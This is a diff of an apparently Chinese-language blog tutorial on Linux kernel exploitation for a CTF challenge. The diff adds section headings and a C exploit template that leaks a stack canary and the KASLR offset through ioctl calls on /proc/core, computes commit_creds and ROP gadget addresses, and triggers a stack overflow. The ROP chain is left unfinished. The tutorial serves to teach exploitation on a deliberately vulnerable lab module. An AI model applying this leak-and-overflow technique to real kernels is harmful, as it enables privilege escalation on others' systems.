@@ -5,7 +5,7 @@ tags:
   - Kernel
   - tutorial
 date: 2024-03-18 19:02:34
-draft: false
+draft: true
 title: "Kernel - How2Kernel 0x01: ROP and pt-regs"
 ---
 
@@ -36,7 +36,7 @@ title: "Kernel - How2Kernel 0x01: ROP and pt-regs"
 
 # 内核态与用户态
 
-首先回过头来思考内核漏洞利用的目标，之所以能够实现提权是因为操作系统本身也不过是一种软件，是位于物理内存中的代码和数据，在**分级保护域**（*保护环，Rings*）的设计思路下 CPU 在执行操作系统内核代码时拥有**高权限环境**（*Ring 0*），而在运行用户代码时通常运行在**低权限环境**（*Ring 3*）。
+首先回过头来思考内核漏洞利用的目标，之所以能够实现提权是因为操作系统本身也不过是一种软件，是位于物理内存中的代码和数据，在**分级保护域**（_保护环，Rings_）的设计思路下 CPU 在执行操作系统内核代码时拥有**高权限环境**（_Ring 0_），而在运行用户代码时通常运行在**低权限环境**（_Ring 3_）。
 
 > [!info] 
 > CPU 处在的保护环通常通过 CS 段寄存器的最低 2 位判断，`00` 表明处在 Ring 0，`11` 表明处在 Ring 3。
@@ -156,6 +156,8 @@ user_ss;
 >
 > 对于这道题，博客中将会逐步开启保护，介绍 Kernel ROP 和基本的保护绕过技巧。
 
+## 如何开始？
+
 1. 解包文件系统：
 
 ```bash
@@ -206,6 +208,8 @@ find . -print0 | cpio --null -ov --format=newc >../core.cpio
 ```
 
 ---
+
+## 分析
 
 接下来把 `rootfs/core.ko` 内核模块拖进 ida，就是常规的逆向分析流程了， ~~相比于用户态的虚拟机题，内核 pwn 还是很少在逆向上设置门槛~~ 。
 
@@ -264,3 +268,57 @@ __int64 __fastcall core_copy_func(__int64 a1)
   }
 }
 ```
+
+接下来就可以写出利用板子，包括状态保存、地址泄漏、漏洞触发（其中找偏移有很多种方法，笔者通常用 gdb 加载有符号的 vmlinux 来看）：
+
+```c
+// author: @eastXueLian
+// usage : eval $buildPhase
+// You can refer to my nix configuration for detailed information.
+
+#include "libLian.h"
+
+extern size_t user_cs, user_ss, user_rflags, user_sp;
+int fd;
+size_t canary, kaslr_offset;
+size_t buf[0x20];
+
+int main() {
+    save_status();
+    fd = open("/proc/core", 2);
+
+    info("STEP 0 - Leak KASLR");
+    ioctl(fd, 0x6677889C, 0x40);
+    ioctl(fd, 0x6677889B, (char *)buf);
+    canary = buf[0];
+    kaslr_offset = buf[4] - 0x140df1 - 0xffffffff8109c8e0;
+    log(canary);
+    log(kaslr_offset);
+
+    size_t init_cred = kaslr_offset + 0xffffffff8223d1a0;
+    size_t commit_creds = kaslr_offset + 0xffffffff8109c8e0;
+    size_t swapgs_restore_regs_and_return_to_usermode =
+        kaslr_offset + 0xffffffff81a008da;
+
+    size_t pop_rdi_ret = kaslr_offset + 0xffffffff81000b2f;
+    size_t iretq = kaslr_offset + 0xffffffff82714844;
+    size_t swapgs_popfq_ret = kaslr_offset + 0xffffffff81a012da;
+
+    info("STEP 1 - Stack Overflow");
+    int i = 8;
+    buf[i++] = canary;
+    buf[i++] = 0;
+
+
+    write(fd, buf, 0x100);
+    ioctl(fd, 0x6677889A, 0xffffffffffff0100ULL);
+
+    return 0;
+}
+```
+
+此后在板子的基础上讨论基本 ROP 链的构造与 SMEP / SMAP / KPTI 保护的绕过：
+
+---
+
+## 常规 ROP
